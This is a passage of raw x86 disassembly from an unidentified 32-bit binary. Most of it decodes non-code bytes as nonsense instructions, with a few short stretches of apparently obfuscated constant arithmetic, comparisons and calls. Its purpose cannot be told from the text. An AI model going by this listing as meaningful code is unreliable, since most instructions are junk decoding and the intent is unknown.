  40bc5e:	or     al,0xfb
  40bc60:	adc    DWORD PTR [esi+ebp*1-0x4ccd1ed8],esp
  40bc67:	mov    bh,0x7d
  40bc69:	push   ss
  40bc6a:	mov    ah,0x3d
  40bc6c:	adc    bl,BYTE PTR [edi+0x43d95c43]
  40bc72:	pop    ecx
  40bc73:	dec    edi
  40bc74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc75:	mov    eax,0x1244307
  40bc7a:	stos   DWORD PTR es:[edi],eax
  40bc7b:	pop    edi
  40bc7c:	mov    ebp,esp
  40bc7e:	add    DWORD PTR [eax+0x37f17b00],edx
  40bc84:	jmp    0x7d99c7b4
  40bc89:	pop    ds
  40bc8a:	jmp    0x94a59b2c
  40bc8f:	pop    edi
  40bc90:	cdq    
  40bc91:	pop    edx
  40bc92:	and    ebx,DWORD PTR [ecx]
  40bc94:	and    ah,bl
  40bc96:	iret   
  40bc97:	cdq    
  40bc98:	xchg   edx,eax
  40bc99:	pop    edi
  40bc9a:	ins    DWORD PTR es:[edi],dx
  40bc9b:	push   edx
  40bc9c:	loop   0x40bca4
  40bc9e:	popf   
  40bc9f:	neg    BYTE PTR [esp+edx*4]
  40bca2:	ja     0x40bd08
  40bca4:	mov    ah,cl
  40bca6:	test   al,0xe0
  40bca8:	jmp    0x869a:0x3c022481
  40bcaf:	cmp    BYTE PTR [ebx+0x22],bh
  40bcb2:	stc    
  40bcb3:	mov    fs,eax
  40bcb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcb6:	pop    ecx
  40bcb7:	cdq    
  40bcb8:	and    BYTE PTR [eax+0x21],cl
  40bcbb:	cmp    bl,BYTE PTR [ecx-0x6d]
  40bcbe:	sbb    eax,0xb71e90b4
  40bcc3:	xor    ebx,DWORD PTR [ebx]
  40bcc5:	xchg   esp,eax
  40bcc6:	jmp    0x598c:0xb7905542
  40bccd:	jecxz  0x40bd4a
  40bccf:	sahf   
  40bcd0:	push   eax
  40bcd1:	lea    edx,ds:0x3bd8250e
  40bcd7:	fild   WORD PTR [ecx]
  40bcd9:	jecxz  0x40bd0e
  40bcdb:	daa    
  40bcdc:	fist   DWORD PTR [si-0x48]
  40bce0:	data16 sbb BYTE PTR [ecx-0x269dfc6d],0x13
  40bce8:	xchg   ebp,eax
  40bce9:	jb     0x40bc99
  40bceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcec:	xchg   ebp,eax
  40bced:	data16 shl BYTE PTR [eax+0x30],cl
  40bcf1:	into   
  40bcf2:	test   BYTE PTR [eax+0x69],dl
  40bcf5:	mov    bh,0x25
  40bcf7:	out    0x99,eax
  40bcf9:	mov    edx,esi
  40bcfb:	shr    edi,cl
  40bcfd:	inc    edi
  40bcfe:	in     eax,dx
  40bcff:	pop    esi
  40bd00:	outs   dx,BYTE PTR cs:[esi]
  40bd02:	cmp    al,0x9d
  40bd04:	repnz not BYTE PTR [eax]
  40bd07:	test   eax,0xd0fe9350
  40bd0c:	mov    dl,BYTE PTR [edx-0x4538593f]
  40bd12:	test   al,0xb0
  40bd14:	dec    ebx
  40bd15:	pop    esi
  40bd16:	jae    0x40bcae
  40bd18:	pop    edx
  40bd19:	add    WORD PTR ds:0xd5101f9,di
  40bd20:	retf   
  40bd21:	ss loopne 0x40bcf0
  40bd24:	or     al,0x99
  40bd26:	not    DWORD PTR [esi]
  40bd28:	fadd   QWORD PTR [edi+0x0]
  40bd2b:	stos   BYTE PTR es:[edi],al
  40bd2c:	dec    ebx
  40bd2d:	mov    cl,dl
  40bd2f:	fwait
  40bd30:	cmp    ecx,ebp
  40bd32:	mov    ecx,0x9de09699
  40bd37:	icebp  
  40bd38:	(bad)  
  40bd39:	stos   BYTE PTR es:[edi],al
  40bd3a:	xchg   ecx,eax
  40bd3b:	mov    al,ds:0x4c4ab67a
  40bd40:	add    al,0xeb
  40bd42:	xlat   BYTE PTR ds:[ebx]
  40bd43:	adc    BYTE PTR [ebp+0x3],0x7f
  40bd47:	neg    BYTE PTR [eax+eax*2+0x27]
  40bd4b:	scas   eax,DWORD PTR es:[edi]
  40bd4c:	push   eax
  40bd4e:	push   cs
  40bd4f:	or     eax,ebp
  40bd51:	jp     0x40bdbf
  40bd53:	enter  0xb156,0xbc
  40bd57:	stc    
  40bd58:	inc    ebx
  40bd59:	or     al,0xc0
  40bd5b:	mov    al,ds:0xd2de8623
  40bd60:	jnp    0x40bd3e
  40bd62:	mov    ecx,0xbb41b56a
  40bd67:	push   ss
  40bd68:	fnstsw WORD PTR [edx-0x973a0f9]
  40bd6e:	leave  
  40bd6f:	cmp    eax,0x5781a938
  40bd74:	je     0x40bd74
  40bd76:	pop    ecx
  40bd77:	pop    esi
  40bd78:	jno    0x40bde4
  40bd7a:	es pusha 
  40bd7c:	jae    0x40bdf2
  40bd7e:	inc    edx
  40bd7f:	sub    esi,edx
  40bd81:	pop    edi
  40bd82:	sub    eax,0x5fe9e331
  40bd87:	mov    fs,WORD PTR [ecx-0x622964aa]
  40bd8d:	sbb    DWORD PTR [ebx],eax
  40bd8f:	xlat   BYTE PTR ds:[ebx]
  40bd90:	inc    ebp
  40bd91:	xchg   ebp,eax
  40bd92:	mov    eax,0x4bea14ca
  40bd97:	stos   BYTE PTR es:[edi],al
  40bd98:	cmp    BYTE PTR [edx],0x4d
  40bd9b:	add    al,0x84
  40bd9d:	fwait
  40bd9e:	lods   eax,DWORD PTR ds:[esi]
  40bd9f:	mov    esp,DWORD PTR [ebx+ecx*4]
  40bda2:	cmc    
  40bda3:	inc    ebx
  40bda4:	xor    DWORD PTR [ebp+0x39],ebp
  40bda7:	add    DWORD PTR [ebx],ebp
  40bda9:	icebp  
  40bdaa:	sbb    al,0xba
  40bdac:	dec    edi
  40bdad:	xchg   eax,esp
  40bdaf:	test   eax,0x1052c09b
  40bdb4:	retf   0x6a7b
  40bdb7:	jmp    0x40bd84
  40bdb9:	loop   0x40bdf0
  40bdbb:	outs   dx,DWORD PTR ds:[esi]
  40bdbc:	and    BYTE PTR [esi-0x2c56847e],dh
  40bdc2:	js     0x40bd7d
  40bdc4:	sbb    eax,0x5fc73ec5
  40bdc9:	lods   eax,DWORD PTR ds:[esi]
  40bdca:	push   edx
  40bdcb:	cmp    BYTE PTR [esi],bl
  40bdcd:	push   0x56245333
  40bdd2:	ins    DWORD PTR es:[edi],dx
  40bdd3:	retf   
  40bdd4:	add    al,0xfb
  40bdd6:	xor    ah,dl
  40bdd8:	out    dx,al
  40bdd9:	cs das 
  40bddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bddc:	sahf   
  40bddd:	push   edx
  40bdde:	sub    eax,0x4f15011c
  40bde3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde4:	into   
  40bde5:	out    dx,eax
  40bde6:	inc    esp
  40bde7:	fistp  WORD PTR [edi]
  40bde9:	or     eax,0xbf6bb724
  40bdee:	sub    bh,ch
  40bdf0:	shl    DWORD PTR [edx],1
  40bdf2:	retf   
  40bdf3:	ds push ecx
  40bdf5:	lea    ebp,[edx+0xf]
  40bdf8:	add    DWORD PTR [ecx+0x75],edx
  40bdfb:	cwde   
  40bdfc:	xchg   ebx,eax
  40bdfd:	imul   esp,DWORD PTR [ecx+0x7096ab85],0x882d7b8
  40be07:	ds loopne 0x40bdf9
  40be0a:	xchg   esi,eax
  40be0b:	jecxz  0x40bdcf
  40be0d:	jno    0x40be2a
  40be0f:	add    esi,eax
  40be11:	sbb    al,0x4
  40be13:	into   
  40be14:	call   0x569fa061
  40be19:	mov    esp,0x5b411fcc
  40be1e:	mov    ah,0xd
  40be20:	fs (bad) 
  40be22:	xor    edi,DWORD PTR ds:0x714aade2
  40be28:	mov    esi,0xb232181f
  40be2d:	call   0xabffaa99
  40be32:	adc    BYTE PTR [ebx+0x6e],0x40
  40be36:	icebp  
  40be37:	or     edx,ebp
  40be39:	adc    cl,BYTE PTR [ecx]
  40be3b:	jecxz  0x40bdce
  40be3d:	dec    eax
  40be3e:	dec    esi
  40be3f:	mov    ebx,0x79942709
  40be44:	outs   dx,DWORD PTR ds:[esi]
  40be45:	imul   edx,DWORD PTR [ecx-0x3fb852bd],0xffffffe3
  40be4c:	mov    al,ds:0x4441a0fe
  40be51:	sub    cl,BYTE PTR [edi+0x3]
  40be54:	jl     0x40bdf0
  40be56:	push   eax
  40be57:	add    ebx,DWORD PTR [ecx]
  40be59:	inc    edx
  40be5a:	mov    cl,0xc4
  40be5c:	addr16 xchg ebp,eax
  40be5e:	mov    esp,0x31d87904
  40be63:	jmp    0x3f2:0x5be0a826
  40be6a:	push   0x44
  40be6c:	rcl    cl,cl
  40be6e:	or     BYTE PTR [esi+edi*2],bl
  40be71:	sti    
  40be72:	inc    esp
  40be73:	pop    esi
  40be74:	das    
  40be75:	jmp    0xcb041733
  40be7a:	mov    WORD PTR [ebp+0x4e],ss
  40be7d:	fidiv  WORD PTR [ebx]
  40be7f:	xor    eax,0x69aab6e4
  40be84:	dec    ebx
  40be85:	adc    al,0x30
  40be87:	mov    bl,0x89
  40be89:	dec    ebp
  40be8a:	hlt    
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf8e
  40bf55:	dec    esp
  40bf56:	mov    ds:0x1805b6bc,eax
  40bf5b:	sbb    BYTE PTR [esi+0x12],ch
  40bf5e:	sbb    BYTE PTR [eax],bl
  40bf60:	inc    ecx
  40bf61:	or     al,BYTE PTR [esi-0x1f]
  40bf64:	pop    edi
  40bf65:	(bad)  
  40bf66:	fldl2e 
  40bf68:	and    bh,bl
  40bf6a:	sbb    DWORD PTR [edi+0x44b05168],edx
  40bf70:	jb     0x40bfd3
  40bf72:	xor    ah,ch
  40bf74:	push   cs
  40bf75:	je     0x40bfa6
  40bf77:	rcl    WORD PTR [eax+0x2c],1
  40bf7b:	dec    esi
  40bf7c:	jnp    0x40bf6e
  40bf7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf7f:	jmp    0x40bfda
  40bf81:	imul   edx,DWORD PTR [esi],0x39b1e0c2
  40bf87:	jb     0x40bf9a
  40bf89:	mov    ah,0x50
  40bf8b:	cmc    
  40bf8c:	rol    BYTE PTR [esi+edx*8],1
  40bf8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf90:	mov    eax,0xb494e0ff
  40bf95:	jmp    0xd249:0x447f261f
  40bf9c:	imul   cl
  40bf9e:	enter  0x55b,0x34
  40bfa2:	call   FWORD PTR [esi]
  40bfa4:	cmp    BYTE PTR [esp+ecx*8-0x252f6687],ah
  40bfab:	dec    ecx
  40bfac:	pop    ds
  40bfad:	shl    DWORD PTR [ecx-0x33185e17],0xbd
  40bfb4:	fbstp  TBYTE PTR [ecx]
  40bfb6:	cmp    DWORD PTR [ebx-0x76684180],ecx
  40bfbc:	enter  0x7fbc,0xe0
  40bfc0:	and    bh,ch
  40bfc2:	sar    DWORD PTR [ebp+0x4c],1
  40bfc5:	inc    edx
  40bfc6:	outs   dx,BYTE PTR ds:[esi]
  40bfc7:	cmp    eax,0xd5f5632c
  40bfcc:	jbe    0x40c03b
  40bfce:	inc    esp
  40bfcf:	mov    bh,0x9f
  40bfd1:	bnd jns 0x40bf65
  40bfd4:	inc    ebp
  40bfd5:	mov    ecx,0xb9ca7a98
  40bfda:	dec    ebx
  40bfdb:	fisttp WORD PTR [edx]
  40bfdd:	loopne 0x40c013
  40bfdf:	out    dx,eax
  40bfe0:	mov    edi,0x897e9700
  40bfe5:	pop    ebp
  40bfe6:	into   
  40bfe7:	loopne 0x40c014
  40bfe9:	dec    esi
  40bfea:	cld    
  40bfeb:	loope  0x40bfc2
  40bfed:	push   edx
  40bfee:	add    DWORD PTR [edx-0x4c5c2672],esi
  40bff4:	or     eax,0x722b93bc
  40bff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bffa:	nop
  40bffb:	mov    esp,0x754ea3b9
  40c000:	xchg   bl,al
  40c002:	cmp    ah,BYTE PTR [ebx+0x3de75fad]
  40c008:	mov    ch,0x93
  40c00a:	mov    ah,0x5c
  40c00c:	loope  0x40c036
  40c00e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c00f:	inc    ecx
  40c010:	iret   
  40c011:	cmp    al,0xd2
  40c013:	jnp    0x40c027
  40c015:	mov    esi,0x174bd5b1
  40c01a:	ret    
  40c01b:	test   eax,0x8875e8fa
  40c020:	fsubr  st,st(5)
  40c022:	bound  ebp,QWORD PTR [ecx-0x7f]
  40c025:	fwait
  40c026:	cmp    dl,BYTE PTR [edx]
  40c028:	xchg   esi,eax
  40c029:	dec    ecx
  40c02a:	sbb    esi,0xffffffca
  40c02d:	aam    0xa0
  40c02f:	sub    ecx,ecx
  40c031:	leave  
  40c032:	repz mov ebx,DWORD PTR [edx-0x7ff4a358]
  40c039:	int3   
  40c03a:	fnstcw WORD PTR es:[eax+0x2f]
  40c03e:	outs   dx,BYTE PTR ds:[esi]
  40c03f:	rcl    ah,cl
  40c041:	push   0xe35c7642
  40c046:	retf   
  40c047:	and    DWORD PTR [ebp+0x59c528e],0xa02b8bd5
  40c051:	pop    ebp
  40c052:	adc    eax,0x48c394f0
  40c057:	(bad)  
  40c058:	clc    
  40c059:	or     dl,dl
  40c05b:	es add ecx,ebx
  40c05e:	pop    ebx
  40c05f:	jae    0x40c0bf
  40c061:	mov    dl,0xe4
  40c063:	xchg   BYTE PTR [ecx],cl
  40c065:	pop    es
  40c066:	outs   dx,DWORD PTR ds:[esi]
  40c067:	sbb    cl,cl
  40c069:	mov    al,0xe1
  40c06b:	mov    edi,0xe3c1413b
  40c070:	mov    esp,0x5541a8ae
  40c075:	pop    ds
  40c076:	pop    ebx
  40c077:	jno    0x40c04a
  40c079:	sbb    al,0xa0
  40c07b:	int    0x10
  40c07d:	cmc    
  40c07e:	fist   WORD PTR [esi]
  40c080:	add    DWORD PTR [ebp+esi*8-0x8bf5671],0x10
  40c088:	ret    
  40c089:	(bad)  
  40c08a:	out    0xdf,al
  40c08c:	int    0xfc
  40c08e:	cmp    bl,ah
  40c090:	jle    0x40c0a0
  40c092:	mov    cl,0xee
  40c094:	mov    ds:0x1c9986c1,eax
  40c099:	leave  
  40c09a:	(bad)  
  40c09c:	cmp    ah,BYTE PTR [ebp+eax*1+0x6ea7c7ad]
  40c0a3:	xor    ch,BYTE PTR [edx-0x3]
  40c0a6:	(bad)
  40c0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0aa:	sti    
  40c0ab:	cs ja  0x40c094
  40c0ae:	and    eax,0xbdc98728
  40c0b3:	jb     0x40c054
  40c0b5:	in     al,dx
  40c0b6:	call   0xa089:0xf4241cdb
  40c0bd:	rcr    BYTE PTR [ebx-0x2f898ad0],0xec
  40c0c4:	fldenv [ebp-0x1fe2f2d2]
  40c0ca:	push   es
  40c0cb:	or     BYTE PTR [ebp+0x41],dl
  40c0ce:	iret   
  40c0cf:	call   FWORD PTR [ebx-0x6f]
  40c0d2:	jne    0x40c131
  40c0d4:	test   eax,0xaf72be56
  40c0d9:	sub    BYTE PTR [ebx-0x10a27358],ah
  40c0df:	xchg   BYTE PTR [ebx-0x6a],dh
  40c0e2:	mov    ebx,0xa7e69a66
  40c0e7:	jmp    FWORD PTR ds:0x9b998aa
  40c0ed:	cmp    eax,0xac8225af
  40c0f2:	mov    esp,0x67b813e5
  40c0f7:	call   0x1b6823d9
  40c0fc:	ins    DWORD PTR es:[edi],dx
  40c0fd:	aad    0x7e
  40c0ff:	ret    0x32e1
  40c102:	add    dh,cl
  40c104:	repz adc al,0x48
  40c107:	dec    esi
  40c108:	xchg   ecx,eax
  40c109:	fadd   st(2),st
  40c10b:	jbe    0x40c0e7
  40c10d:	jecxz  0x40c099
  40c10f:	sub    al,0xf
  40c111:	xchg   esi,eax
  40c112:	outs   dx,DWORD PTR ds:[esi]
  40c113:	xlat   BYTE PTR ds:[ebx]
  40c114:	sbb    esp,DWORD PTR [ebx-0xd4384dd]
  40c11a:	jecxz  0x40c0e3
  40c11c:	(bad)  
  40c11d:	jl     0x40c0f1
  40c11f:	or     al,0x46
  40c121:	mov    fs,edi
  40c123:	sub    al,0x42
  40c125:	push   eax
  40c126:	sbb    esi,ebp
  40c128:	pop    ss
  40c129:	sbb    bh,BYTE PTR [edx]
  40c12b:	pop    eax
  40c12c:	pop    esp
  40c12d:	adc    al,0xa0
  40c12f:	(bad)  [edx+0x54f6f4e6]
  40c135:	and    DWORD PTR [ebp-0x3efd297b],ebx
  40c13b:	lock arpl bp,cx
  40c13e:	lods   eax,DWORD PTR ds:[esi]
  40c13f:	leave  
  40c140:	(bad)  [ebx+eiz*1]
  40c143:	sub    eax,0x19062f96
  40c148:	gs popa 
  40c14a:	jge    0x40c14d
  40c14c:	clc    
  40c14d:	sbb    DWORD PTR [edi],ebp
  40c14f:	jp     0x40c19c
  40c151:	popa   
  40c152:	rol    BYTE PTR ds:0xd36ea3d8,1
  40c158:	in     eax,dx
  40c159:	jmp    0x40c0fd
  40c15b:	push   edi
  40c15c:	mov    ecx,0x25ba33a7
  40c161:	lods   eax,DWORD PTR ds:[esi]
  40c162:	mov    ebp,0x6d3f3457
  40c167:	fiadd  DWORD PTR [eax-0x8]
  40c16a:	mov    eax,DWORD PTR [ecx]
  40c16c:	addr16 out 0xd3,eax
  40c16f:	repnz sub BYTE PTR [ecx-0x609b2a13],cl
  40c176:	mov    ecx,DWORD PTR [ebx-0x36]
  40c179:	mov    al,0x11
  40c17b:	retf   
  40c17c:	push   cs
  40c17d:	fbld   TBYTE PTR [ecx]
  40c17f:	psrad  mm3,QWORD PTR [edi+0x1]
  40c183:	ja     0x40c1f7
  40c185:	push   edx
  40c186:	jmp    DWORD PTR [ebx+0x3b4cea60]
  40c18c:	mul    BYTE PTR [eax+0x1]
  40c18f:	xchg   edx,eax
  40c190:	pop    eax
  40c191:	add    edx,esi
  40c193:	mov    ebx,0xdb212f28
  40c198:	xor    eax,0xc3f40fa5
  40c19d:	cmp    ch,bl
  40c19f:	and    DWORD PTR [ecx-0x560deb34],edi
  40c1a5:	shl    DWORD PTR [edi-0x546e6ad9],cl
  40c1ab:	push   eax
  40c1ac:	sub    al,0x51
  40c1ae:	push   ebp
  40c1af:	pop    ebx
  40c1b0:	sub    DWORD PTR ds:0x5935ed36,ebp
  40c1b6:	jmp    0xb9d2:0x6c6ac28
  40c1bd:	mov    ebp,0x8193189e
  40c1c2:	bound  esp,QWORD PTR [edx+0x3e8afbae]
  40c1c8:	ins    BYTE PTR es:[edi],dx
  40c1c9:	pushf  
  40c1ca:	stc    
  40c1cb:	and    DWORD PTR [eax],esi
  40c1cd:	inc    ecx
  40c1ce:	int3   
  40c1cf:	ret    
  40c1d0:	pushf  
  40c1d1:	sar    BYTE PTR [esi+0x32],0xc5
  40c1d5:	clc    
  40c1d6:	in     eax,dx
  40c1d7:	sub    eax,0x47f5e1b7
  40c1dc:	inc    esp
  40c1dd:	arpl   WORD PTR [edi-0x63],si
  40c1e0:	jae    0x40c17c
  40c1e2:	pushf  
  40c1e3:	es jle 0x40c182
  40c1e6:	call   0xca13ca69
  40c1eb:	fst    QWORD PTR [ecx-0x79b7a2bd]
  40c1f1:	mov    ecx,0x90658deb
  40c1f6:	mov    ebp,DWORD PTR es:[eax]
  40c1f9:	and    ebx,DWORD PTR [ecx+0x6b89573a]
  40c1ff:	aam    0x5d
  40c201:	mov    ds:0xb0b7bbb9,al
  40c206:	stos   BYTE PTR es:[edi],al
  40c207:	stos   BYTE PTR es:[edi],al
  40c208:	jne    0x40c287
  40c20a:	int3   
  40c20b:	pop    eax
  40c20c:	xchg   edx,eax
  40c20d:	or     eax,0x895ced48
  40c212:	inc    esp
  40c213:	xchg   ebx,eax
  40c214:	add    ch,BYTE PTR ds:0x460a2d3e
  40c21a:	sub    dh,BYTE PTR [ecx]
  40c21c:	fdivr  QWORD PTR [ecx+ebx*2+0x1f41809d]
  40c223:	(bad)  
  40c224:	sub    eax,0x543f7213
  40c229:	gs xor eax,0x2554f4b
  40c22f:	shl    DWORD PTR [ecx+ebp*2-0x39],1
  40c233:	mov    edx,0xa86297c8
  40c238:	jge    0x40c27e
  40c23a:	cs mov ebp,0x31e23060
  40c240:	fisub  WORD PTR [ebp-0x6b09ef4f]
  40c246:	push   es
  40c247:	pop    ebx
  40c248:	add    esi,DWORD PTR [eax+ebx*4]
  40c24b:	xor    dh,dh
  40c24d:	out    dx,al
  40c24e:	icebp  
  40c24f:	retf   
  40c250:	adc    DWORD PTR [ebx-0x18d1719c],ecx
  40c256:	inc    ebx
  40c257:	(bad)  
  40c258:	jge    0x40c2ac
  40c25a:	jle    0x40c212
  40c25c:	shr    BYTE PTR [edi+0x74],1
  40c25f:	xlat   BYTE PTR ds:[ebx]
  40c260:	pop    ds
  40c261:	pop    eax
  40c262:	jae    0x40c259
  40c264:	jmp    0x28c2a76d
  40c269:	inc    esp
  40c26a:	test   DWORD PTR [eax-0x2e15635a],esi
  40c270:	sbb    ebx,DWORD PTR [ebx+edx*4]
  40c273:	cmp    BYTE PTR [ecx],ah
  40c275:	(bad)  
  40c276:	cli    
  40c277:	imul   edx,eax,0xc5b0abc7
  40c27d:	int    0x8a
  40c27f:	fidivr DWORD PTR [ecx]
  40c281:	test   BYTE PTR [edx+0x1f],0xd4
  40c285:	loopne 0x40c291
  40c287:	stc    
  40c288:	mov    ds:0xda588d9d,al
  40c28d:	mov    edi,0xbff4fc8d
  40c292:	imul   esi,DWORD PTR [esi],0xffffffec
  40c295:	adc    cl,0xf7
  40c298:	loop   0x40c23d
  40c29a:	cmp    eax,DWORD PTR [edi+0x3e]
  40c29d:	mov    bh,0x8
  40c29f:	xchg   esp,eax
  40c2a0:	mov    ah,0x2f
  40c2a2:	jbe    0x40c28e
  40c2a4:	push   es
  40c2a5:	and    eax,0xd963db91
  40c2aa:	mov    eax,0x98013b67
  40c2af:	(bad)  
  40c2b0:	adc    al,0x39
  40c2b2:	jl     0x40c2c8
  40c2b4:	gs sbb al,0xb8
  40c2b7:	div    DWORD PTR [edx+0x64]
  40c2ba:	int    0xa4
  40c2bc:	fld    DWORD PTR [ebp+ecx*1+0x18]
  40c2c0:	bound  ebp,QWORD PTR [esi+eax*8+0x1a]
  40c2c4:	dec    ecx
  40c2c5:	dec    esi
  40c2c6:	inc    eax
  40c2c7:	pop    ebx
  40c2c8:	sbb    esp,DWORD PTR [edi+0x38]
  40c2cb:	mov    ebp,0xf1476002
  40c2d0:	xor    DWORD PTR [edi-0x1d],edi
  40c2d3:	adc    bh,BYTE PTR [edi-0x59]
  40c2d6:	fwait
  40c2d7:	jmp    0x4842:0x5a2d56b1
  40c2de:	aas    
  40c2df:	inc    ebp
  40c2e0:	adc    dh,cl
  40c2e2:	xchg   esp,eax
  40c2e3:	pop    ebx
  40c2e4:	pop    ds
  40c2e5:	or     edi,DWORD PTR [eax-0x45]
  40c2e8:	fdivr  QWORD PTR [edx]
  40c2ea:	fcom   DWORD PTR [eax-0x67]
  40c2ed:	pop    eax
  40c2ee:	ror    DWORD PTR [edi],1
  40c2f0:	test   eax,0x50d0c75
  40c2f5:	out    0xd8,al
  40c2f7:	into   
  40c2f8:	mov    dl,0xe1
  40c2fa:	mov    WORD PTR [ecx],es
  40c2fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2fd:	xor    BYTE PTR fs:[ecx],cl
  40c300:	jmp    0xf801:0x952384bb
  40c307:	mov    ecx,0xe9ae06d1
  40c30c:	cli    
  40c30d:	out    0xe0,eax
  40c30f:	xchg   ebx,eax
  40c310:	adc    bh,al
  40c312:	mov    esi,0x30ff0ef0
  40c317:	xchg   esp,eax
  40c318:	mov    esp,0x1492fea3
  40c31d:	iret   
  40c31e:	rcr    eax,0x4
  40c321:	aam    0x47
  40c323:	jl     0x40c305
  40c325:	cpuid  
  40c327:	fcmovne st,st(7)
  40c329:	retf   
  40c32a:	mov    ch,0x3b
  40c32c:	jbe    0x40c314
  40c32e:	xor    eax,0x9e281897
  40c333:	pop    edx
  40c334:	inc    esp
  40c335:	or     eax,0x504bff7f
  40c33a:	call   0x416c20
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x4227cc
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x4225b8
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x4227cc,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	jne    0x40c35d
  40c3d2:	ret    
  40c3d3:	jl     0x40c3e2
  40c3d5:	std    
  40c3d6:	sbb    BYTE PTR [eax],bl
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [esi+0x13],cl
  40c3de:	ret    0x61e0
  40c3e1:	mov    ebp,0xdbcd90b9
  40c3e6:	add    ah,dl
  40c3e8:	bound  edi,QWORD PTR [edi+edx*1+0x6bccf204]
  40c3ef:	push   esp
  40c3f0:	dec    edx
  40c3f1:	push   0x15
  40c3f3:	or     ch,BYTE PTR [ebx]
  40c3f5:	cmp    edi,ebx
  40c3f7:	sar    DWORD PTR [ebx-0x7a],cl
  40c3fa:	jbe    0x40c3e4
  40c3fc:	sbb    BYTE PTR [eax-0x53abf914],cl
  40c402:	xchg   edx,eax
  40c403:	hlt    
  40c404:	jne    0x40c41a
  40c406:	push   cs
  40c407:	fwait
  40c408:	les    eax,FWORD PTR [edx+0x7b294175]
  40c40e:	xor    DWORD PTR [eax-0x6c],ebx
  40c411:	mov    dl,0xc2
  40c413:	lea    edx,ds:0xfa968c5e
  40c419:	retf   
  40c41a:	mov    ch,0xa9
  40c41c:	mov    BYTE PTR [eax-0x21],ch
  40c41f:	mov    ch,BYTE PTR [eax]
  40c421:	jae    0x40c426
  40c423:	sbb    edi,esp
